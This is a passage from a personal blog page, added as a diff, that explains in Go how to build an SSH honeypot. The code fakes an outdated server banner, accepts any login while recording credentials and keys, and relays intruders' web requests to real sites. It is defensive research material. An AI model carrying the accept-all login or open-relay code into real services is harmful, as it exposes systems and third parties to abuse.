@@ -1,0 +1,2624 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Josh Rendek</title>
+  <meta name="author" content="Josh Rendek">
+
+  
+  <meta name="description" content="I’ve been running https://sshpot.com/ for a while now - and decided it needed to be revamped and overhauled - and thought I’d make a presentation and &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://joshrendek.com">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Josh Rendek" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href='//fonts.googleapis.com/css?family=Lato:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-3754808-1']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">
+      <span class="blue-brace">{</span>Josh Rendek<span class="blue-brace">}</span>
+  </a></h1>
+  
+  <div class="subtitle">
+  <h2>
+    <span class="heart"><3</span> Ruby &amp; Go
+  </h2>
+  </div>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:joshrendek.com" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Home</a></li>
+  <li><a href="/projects/">Projects</a></li>
+  <li><a href="/archives">Archives</a></li>
+  <li><a href="https://devopsbyvideo.com/">Screen Casts</a></li>
+  <li><a href="/categories">Categories</a></li>
+  <li><a href="/resume/">Resumé</a></li>
+  <li><a href="/about/">About</a></li>
+  <li><a href="https://github.com/joshrendek">Github</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div class="blog-index">
+  
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/2016/06/building-honeypots-and-analyzing-linux-malware/">Building Honeypots and Analyzing Linux Malware</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2016-06-30T21:53:08-04:00" pubdate data-updated="true">Jun 30<sup>th</sup>, 2016</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>I’ve been running <a href="https://sshpot.com/">https://sshpot.com/</a> for a while now - and decided it needed to be revamped and overhauled - and thought I’d make a presentation and write up some details on the process as well. If you&rsquo;d like to just view the slides, hop over <a href="https://docs.google.com/presentation/d/1rSrypB4_oarVGv-z5vRY6w_bgZ1DTzSexMWThyn1f2Q">here</a>.</p>
+
+<p>If you&rsquo;re just looking for the source code:</p>
+
+<ul>
+<li>Web application
+
+<ul>
+<li><a href="https://github.com/joshrendek/ssh-passwd-honeypot">https://github.com/joshrendek/ssh-passwd-honeypot</a></li>
+</ul>
+</li>
+<li>Honeypot Server
+
+<ul>
+<li><a href="https://github.com/joshrendek/sshpot-com">https://github.com/joshrendek/sshpot-com</a></li>
+</ul>
+</li>
+</ul>
+
+
+<h4>Table of Contents</h4>
+
+<ul>
+<li><a href="#design-goals">Design Goals</a>
+
+<ul>
+<li><a href="#appearing-more-vulnerable">Appearing More Vulnerable</a></li>
+<li><a href="#correlating-sessions">Correlating Sessions &amp; Commands</a></li>
+<li><a href="#proxying-requests">Proxying Requests &amp; Capturing Data</a></li>
+</ul>
+</li>
+<li><a href="#handling-requests">Handling Requests</a></li>
+<li><a href="#simulating-commands">Simulating Commands</a></li>
+<li><a href="#persistence-layer">Persistence Layer</a></li>
+<li><a href="#analyzing-dropped-files">Analyzing Dropped Files</a>
+
+<ul>
+<li><a href="#trojan">Trojan-DDoS.Linux.Xarcen.a</a></li>
+<li><a href="#ddos-flood">DDOS.Flood / DnsAmp</a></li>
+</ul>
+</li>
+</ul>
+
+
+<p><a name="design-goals"></a></p>
+
+<h2>Design goals</h2>
+
+<p>I wanted to make sure this was an improvement over the previous iteration, so I laid out several goals for the rewrite:</p>
+
+<ul>
+<li>Appear more ‘vulnerable&#8217;</li>
+<li>Correlate commands/sessions (old version just logged data)</li>
+<li>Proxy requests and capture data</li>
+<li>Better statistics</li>
+<li>Redesigned command simulation using interfaces instead of simple string matching</li>
+</ul>
+
+
+<p>Some important steps the honeypot must do:</p>
+
+<ul>
+<li>generate a new private key pair for the server on every boot (appear like a fresh server)</li>
+<li>Advertise a vulnerable version - Check past CVE’s if you want to target a specific one. <strong>Important</strong> the banner must start with SSH-2.0 or the client won’t handshake</li>
+<li>Must listen on port 22, so you should move the actual SSHD to port 2222 (or any other port, for example)</li>
+<li>Do the SSH handshake</li>
+<li>Handle requests</li>
+</ul>
+
+
+<p><a name="appearing-more-vulnerable"></a></p>
+
+<h4>Appearing More Vulnerable</h4>
+
+<p>We need to create an SSH config for the <code>ssh</code> package to use when constructing a new object. An important thing to note here is the <code>SSH-2.0</code> prefix to the <code>ServerVersion</code> - if that is missing the client will do weird things (including not connecting).</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="nx">sshConfig</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="nx">ssh</span><span class="p">.</span><span class="nx">ServerConfig</span><span class="p">{</span>
+</span><span class='line'>      <span class="nx">PasswordCallback</span><span class="p">:</span>  <span class="nx">passAuthCallback</span><span class="p">,</span>
+</span><span class='line'>      <span class="nx">PublicKeyCallback</span><span class="p">:</span> <span class="nx">keyAuthCallback</span><span class="p">,</span>
+</span><span class='line'>      <span class="nx">ServerVersion</span><span class="p">:</span>     <span class="s">&quot;SSH-2.0-OpenSSH_6.4p1, OpenSSL 1.0.1e-fips 11 Feb 2013&quot;</span><span class="p">,</span> <span class="c1">// old and vulnerable!</span>
+</span><span class='line'>  <span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><a name="correlating-sessions"></a></p>
+
+<h4>Correlating Sessions and Commands</h4>
+
+<p>In order to correlate requests we can use the permission extension in the ssh package to store a map of data - in our case, a simple GUID to keep state across requests. This could also be used to store a user id or some other type of session identifier, for instance, if you were trying to write your own replacement ssh daemon to do things like serving up git requests.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="kd">func</span> <span class="nx">passAuthCallback</span><span class="p">(</span><span class="nx">conn</span> <span class="nx">ssh</span><span class="p">.</span><span class="nx">ConnMetadata</span><span class="p">,</span> <span class="nx">password</span> <span class="p">[]</span><span class="kt">byte</span><span class="p">)</span> <span class="p">(</span><span class="o">*</span><span class="nx">ssh</span><span class="p">.</span><span class="nx">Permissions</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>  <span class="nx">guid</span> <span class="o">:=</span> <span class="nx">uuid</span><span class="p">.</span><span class="nx">NewV4</span><span class="p">()</span>
+</span><span class='line'>  <span class="nx">ip</span><span class="p">,</span> <span class="nx">remotePort</span> <span class="o">:=</span> <span class="nx">parseIpPortFrom</span><span class="p">(</span><span class="nx">conn</span><span class="p">)</span>
+</span><span class='line'>  <span class="nx">login</span> <span class="o">:=</span> <span class="nx">SshLogin</span><span class="p">{</span><span class="nx">RemoteAddr</span><span class="p">:</span> <span class="nx">ip</span><span class="p">,</span>
+</span><span class='line'>      <span class="nx">RemotePort</span><span class="p">:</span> <span class="nx">remotePort</span><span class="p">,</span>
+</span><span class='line'>      <span class="nx">Username</span><span class="p">:</span>   <span class="nx">conn</span><span class="p">.</span><span class="nx">User</span><span class="p">(),</span>
+</span><span class='line'>      <span class="nx">Password</span><span class="p">:</span>   <span class="nb">string</span><span class="p">(</span><span class="nx">password</span><span class="p">),</span>
+</span><span class='line'>      <span class="nx">Guid</span><span class="p">:</span>       <span class="nx">guid</span><span class="p">.</span><span class="nx">String</span><span class="p">(),</span>
+</span><span class='line'>      <span class="nx">Version</span><span class="p">:</span>    <span class="nb">string</span><span class="p">(</span><span class="nx">conn</span><span class="p">.</span><span class="nx">ClientVersion</span><span class="p">()),</span>
+</span><span class='line'>      <span class="nx">LoginType</span><span class="p">:</span>  <span class="s">&quot;password&quot;</span><span class="p">,</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>  <span class="nx">login</span><span class="p">.</span><span class="nx">Save</span><span class="p">()</span>
+</span><span class='line'>  <span class="k">return</span> <span class="o">&amp;</span><span class="nx">ssh</span><span class="p">.</span><span class="nx">Permissions</span><span class="p">{</span><span class="nx">Extensions</span><span class="p">:</span> <span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kt">string</span><span class="p">{</span><span class="s">&quot;guid&quot;</span><span class="p">:</span> <span class="nx">guid</span><span class="p">.</span><span class="nx">String</span><span class="p">()}},</span> <span class="kc">nil</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We want to capture as much metadata about the connection as possible, as well as capture public keys that are available when the attacker is using an ssh-agent - this can help us in the future to possibly identify bad actors. Here we marshal the public key and capture the key type being sent.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="kd">func</span> <span class="nx">keyAuthCallback</span><span class="p">(</span><span class="nx">conn</span> <span class="nx">ssh</span><span class="p">.</span><span class="nx">ConnMetadata</span><span class="p">,</span> <span class="nx">key</span> <span class="nx">ssh</span><span class="p">.</span><span class="nx">PublicKey</span><span class="p">)</span> <span class="p">(</span><span class="o">*</span><span class="nx">ssh</span><span class="p">.</span><span class="nx">Permissions</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>  <span class="nx">guid</span> <span class="o">:=</span> <span class="nx">uuid</span><span class="p">.</span><span class="nx">NewV4</span><span class="p">()</span>
+</span><span class='line'>  <span class="nx">ip</span><span class="p">,</span> <span class="nx">remotePort</span> <span class="o">:=</span> <span class="nx">parseIpPortFrom</span><span class="p">(</span><span class="nx">conn</span><span class="p">)</span>
+</span><span class='line'>  <span class="nx">login</span> <span class="o">:=</span> <span class="nx">SshLogin</span><span class="p">{</span><span class="nx">RemoteAddr</span><span class="p">:</span> <span class="nx">ip</span><span class="p">,</span>
+</span><span class='line'>      <span class="nx">RemotePort</span><span class="p">:</span> <span class="nx">remotePort</span><span class="p">,</span>
+</span><span class='line'>      <span class="nx">Username</span><span class="p">:</span>   <span class="nx">conn</span><span class="p">.</span><span class="nx">User</span><span class="p">(),</span>
+</span><span class='line'>      <span class="nx">Guid</span><span class="p">:</span>       <span class="nx">guid</span><span class="p">.</span><span class="nx">String</span><span class="p">(),</span>
+</span><span class='line'>      <span class="nx">Version</span><span class="p">:</span>    <span class="nb">string</span><span class="p">(</span><span class="nx">conn</span><span class="p">.</span><span class="nx">ClientVersion</span><span class="p">()),</span>
+</span><span class='line'>      <span class="nx">PublicKey</span><span class="p">:</span>  <span class="nx">key</span><span class="p">.</span><span class="nx">Marshal</span><span class="p">(),</span>
+</span><span class='line'>      <span class="nx">KeyType</span><span class="p">:</span>    <span class="nb">string</span><span class="p">(</span><span class="nx">key</span><span class="p">.</span><span class="nx">Type</span><span class="p">()),</span>
+</span><span class='line'>      <span class="nx">LoginType</span><span class="p">:</span>  <span class="s">&quot;key&quot;</span><span class="p">,</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>  <span class="k">go</span> <span class="nx">login</span><span class="p">.</span><span class="nx">Save</span><span class="p">()</span>
+</span><span class='line'>  <span class="c1">//log.Println(&quot;Fail to authenticate&quot;, conn, &quot;:&quot;, err)</span>
+</span><span class='line'>  <span class="c1">//return nil, errors.New(&quot;invalid authentication&quot;)</span>
+</span><span class='line'>  <span class="k">return</span> <span class="o">&amp;</span><span class="nx">ssh</span><span class="p">.</span><span class="nx">Permissions</span><span class="p">{</span><span class="nx">Extensions</span><span class="p">:</span> <span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kt">string</span><span class="p">{</span><span class="s">&quot;guid&quot;</span><span class="p">:</span> <span class="nx">guid</span><span class="p">.</span><span class="nx">String</span><span class="p">()}},</span> <span class="kc">nil</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><a name="proxying-requests"></a></p>
+
+<h4>Proxying Requests and Capturing Data</h4>
+
+<p>Now we can talk about proxying requests. I&rsquo;m going to throw some code at you then explain below:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="kd">func</span> <span class="nx">HandleTcpReading</span><span class="p">(</span><span class="nx">channel</span> <span class="nx">ssh</span><span class="p">.</span><span class="nx">Channel</span><span class="p">,</span> <span class="nx">term</span> <span class="o">*</span><span class="nx">terminal</span><span class="p">.</span><span class="nx">Terminal</span><span class="p">,</span> <span class="nx">perms</span> <span class="o">*</span><span class="nx">ssh</span><span class="p">.</span><span class="nx">Permissions</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>  <span class="k">defer</span> <span class="nx">channel</span><span class="p">.</span><span class="nx">Close</span><span class="p">()</span>
+</span><span class='line'>  <span class="k">for</span> <span class="p">{</span>
+</span><span class='line'>      <span class="c1">// read up to 1MB of data</span>
+</span><span class='line'>      <span class="nx">b</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">([]</span><span class="kt">byte</span><span class="p">,</span> <span class="mi">1024</span><span class="o">*</span><span class="mi">1024</span><span class="p">)</span>
+</span><span class='line'>      <span class="nx">_</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">channel</span><span class="p">.</span><span class="nx">Read</span><span class="p">(</span><span class="nx">b</span><span class="p">)</span>
+</span><span class='line'>      <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span><span class='line'>          <span class="k">if</span> <span class="nx">err</span><span class="p">.</span><span class="nx">Error</span><span class="p">()</span> <span class="o">==</span> <span class="s">&quot;EOF&quot;</span> <span class="p">{</span>
+</span><span class='line'>              <span class="k">return</span>
+</span><span class='line'>          <span class="p">}</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>      <span class="nx">read</span> <span class="o">:=</span> <span class="nx">bufio</span><span class="p">.</span><span class="nx">NewReader</span><span class="p">(</span><span class="nx">strings</span><span class="p">.</span><span class="nx">NewReader</span><span class="p">(</span><span class="nb">string</span><span class="p">(</span><span class="nx">b</span><span class="p">)))</span>
+</span><span class='line'>      <span class="nx">toReq</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">http</span><span class="p">.</span><span class="nx">ReadRequest</span><span class="p">(</span><span class="nx">read</span><span class="p">)</span>
+</span><span class='line'>      <span class="c1">// TODO: https will panic atm - not supported</span>
+</span><span class='line'>      <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span><span class='line'>          <span class="nx">log</span><span class="p">.</span><span class="nx">Println</span><span class="p">(</span><span class="s">&quot;Error parsing request: &quot;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
+</span><span class='line'>          <span class="k">return</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>      <span class="nx">err</span> <span class="p">=</span> <span class="nx">toReq</span><span class="p">.</span><span class="nx">ParseForm</span><span class="p">()</span>
+</span><span class='line'>      <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span><span class='line'>          <span class="nx">log</span><span class="p">.</span><span class="nx">Println</span><span class="p">(</span><span class="s">&quot;Error parsing form: &quot;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
+</span><span class='line'>          <span class="k">return</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>      <span class="nx">url</span> <span class="o">:=</span> <span class="nx">fmt</span><span class="p">.</span><span class="nx">Sprintf</span><span class="p">(</span><span class="s">&quot;%s%s&quot;</span><span class="p">,</span> <span class="nx">toReq</span><span class="p">.</span><span class="nx">Host</span><span class="p">,</span> <span class="nx">toReq</span><span class="p">.</span><span class="nx">URL</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="nx">httpReq</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="nx">HttpRequest</span><span class="p">{</span>
+</span><span class='line'>          <span class="nx">Headers</span><span class="p">:</span>  <span class="nx">toReq</span><span class="p">.</span><span class="nx">Header</span><span class="p">,</span>
+</span><span class='line'>          <span class="nx">URL</span><span class="p">:</span>      <span class="nx">url</span><span class="p">,</span>
+</span><span class='line'>          <span class="nx">FormData</span><span class="p">:</span> <span class="nx">toReq</span><span class="p">.</span><span class="nx">Form</span><span class="p">,</span>
+</span><span class='line'>          <span class="nx">Method</span><span class="p">:</span>   <span class="nx">toReq</span><span class="p">.</span><span class="nx">Method</span><span class="p">,</span>
+</span><span class='line'>          <span class="nx">Guid</span><span class="p">:</span>     <span class="nx">perms</span><span class="p">.</span><span class="nx">Extensions</span><span class="p">[</span><span class="s">&quot;guid&quot;</span><span class="p">],</span>
+</span><span class='line'>          <span class="nx">Hostname</span><span class="p">:</span> <span class="nx">toReq</span><span class="p">.</span><span class="nx">Host</span><span class="p">,</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="nx">client</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="nx">http</span><span class="p">.</span><span class="nx">Client</span><span class="p">{}</span>
+</span><span class='line'>      <span class="nx">resp</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">client</span><span class="p">.</span><span class="nx">Get</span><span class="p">(</span><span class="nx">fmt</span><span class="p">.</span><span class="nx">Sprintf</span><span class="p">(</span><span class="s">&quot;http://%s&quot;</span><span class="p">,</span> <span class="nx">url</span><span class="p">))</span>
+</span><span class='line'>      <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span><span class='line'>          <span class="nx">log</span><span class="p">.</span><span class="nx">Fatalf</span><span class="p">(</span><span class="s">&quot;Body read error: %s&quot;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="k">defer</span> <span class="nx">resp</span><span class="p">.</span><span class="nx">Body</span><span class="p">.</span><span class="nx">Close</span><span class="p">()</span>
+</span><span class='line'>      <span class="nx">body</span><span class="p">,</span> <span class="nx">err2</span> <span class="o">:=</span> <span class="nx">ioutil</span><span class="p">.</span><span class="nx">ReadAll</span><span class="p">(</span><span class="nx">resp</span><span class="p">.</span><span class="nx">Body</span><span class="p">)</span>
+</span><span class='line'>      <span class="k">if</span> <span class="nx">err2</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span><span class='line'>          <span class="nx">log</span><span class="p">.</span><span class="nx">Fatalf</span><span class="p">(</span><span class="s">&quot;Body read error: %s&quot;</span><span class="p">,</span> <span class="nx">err2</span><span class="p">)</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>      <span class="nx">httpReq</span><span class="p">.</span><span class="nx">Response</span> <span class="p">=</span> <span class="nb">string</span><span class="p">(</span><span class="nx">body</span><span class="p">)</span>
+</span><span class='line'>      <span class="nx">httpReq</span><span class="p">.</span><span class="nx">Save</span><span class="p">()</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="nx">log</span><span class="p">.</span><span class="nx">Printf</span><span class="p">(</span><span class="s">&quot;[ http://%s ] %s&quot;</span><span class="p">,</span> <span class="nx">url</span><span class="p">,</span> <span class="nx">body</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="nx">channel</span><span class="p">.</span><span class="nx">Write</span><span class="p">(</span><span class="nx">body</span><span class="p">)</span>
+</span><span class='line'>      <span class="c1">// make the http request</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="c1">//if resp, ok := httpHandler[url]; ok {</span>
+</span><span class='line'>      <span class="c1">// channel.Write(resp)</span>
+</span><span class='line'>      <span class="c1">//} else {</span>
+</span><span class='line'>      <span class="c1">// channel.Write([]byte(&quot;45.4.5.6&quot;))</span>
+</span><span class='line'>      <span class="c1">//}</span>
+</span><span class='line'>      <span class="nx">channel</span><span class="p">.</span><span class="nx">Close</span><span class="p">()</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>On line 5 we&rsquo;re going to read directly from the TCP connection, and only up to 1MB of data - if we get an EOF we&rsquo;ll return. Next on line 12/13 we&rsquo;re using a nice part of the http package that lets us take a raw stream of TCP bytes and convert it to the appropriate HTTP request that its asking for (like <code>GET /foobar</code>) and handling all the other headers/post params.</p>
+
+<p>After getting the TCP request into something we can work with more easily, we parse out any form params on line 19, and then we reconstruct the url to visit on line 24.</p>
+
+<p>Line 26 is using our persistence struct to save everything that has come in so far.</p>
+
+<p>Line 25 and line 54 can be interchanged. For my honeypots I&rsquo;m actually making the raw requests that they&rsquo;re asking for (only <code>GET</code>s) - the other option is using the <code>httpHandler</code> struct and create dummy responses for various websites. After we make the raw request we store the response in our persistence struct and save it to the API on line 46/47.</p>
+
+<p>Finally on line 59 we close the channel to tell the client that data has been returned and is done.</p>
+
+<p><a name="handling-requests"></a></p>
+
+<h2>Handling requests</h2>
+
+<p>The biggest portion of handling requests is accepting them and sending them off to be handled by the channel handler - which will be incoming commands and tcp connections. We loop to handle connections and perform the handshake for each new request.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="k">for</span> <span class="p">{</span>
+</span><span class='line'>      <span class="nx">tcpConn</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">listener</span><span class="p">.</span><span class="nx">Accept</span><span class="p">()</span>
+</span><span class='line'>      <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span><span class='line'>          <span class="nx">log</span><span class="p">.</span><span class="nx">Printf</span><span class="p">(</span><span class="s">&quot;failed to accept incoming connection (%s)&quot;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
+</span><span class='line'>          <span class="k">continue</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>      <span class="c1">// Before use, a handshake must be performed on the incoming net.Conn.</span>
+</span><span class='line'>      <span class="nx">sshConn</span><span class="p">,</span> <span class="nx">chans</span><span class="p">,</span> <span class="nx">reqs</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">ssh</span><span class="p">.</span><span class="nx">NewServerConn</span><span class="p">(</span><span class="nx">tcpConn</span><span class="p">,</span> <span class="nx">sshConfig</span><span class="p">)</span>
+</span><span class='line'>      <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span><span class='line'>          <span class="nx">log</span><span class="p">.</span><span class="nx">Printf</span><span class="p">(</span><span class="s">&quot;failed to handshake (%s)&quot;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
+</span><span class='line'>          <span class="k">continue</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="c1">// Check remote address</span>
+</span><span class='line'>      <span class="nx">log</span><span class="p">.</span><span class="nx">Printf</span><span class="p">(</span><span class="s">&quot;new ssh connection from %s (%s)&quot;</span><span class="p">,</span> <span class="nx">sshConn</span><span class="p">.</span><span class="nx">RemoteAddr</span><span class="p">(),</span> <span class="nx">sshConn</span><span class="p">.</span><span class="nx">ClientVersion</span><span class="p">())</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="c1">// Print incoming out-of-band Requests</span>
+</span><span class='line'>      <span class="k">go</span> <span class="nx">handleRequests</span><span class="p">(</span><span class="nx">reqs</span><span class="p">)</span>
+</span><span class='line'>      <span class="c1">// Accept all channels</span>
+</span><span class='line'>      <span class="k">go</span> <span class="nx">handleChannels</span><span class="p">(</span><span class="nx">chans</span><span class="p">,</span> <span class="nx">sshConn</span><span class="p">.</span><span class="nx">Permissions</span><span class="p">)</span>
+</span><span class='line'>  <span class="p">}</span>
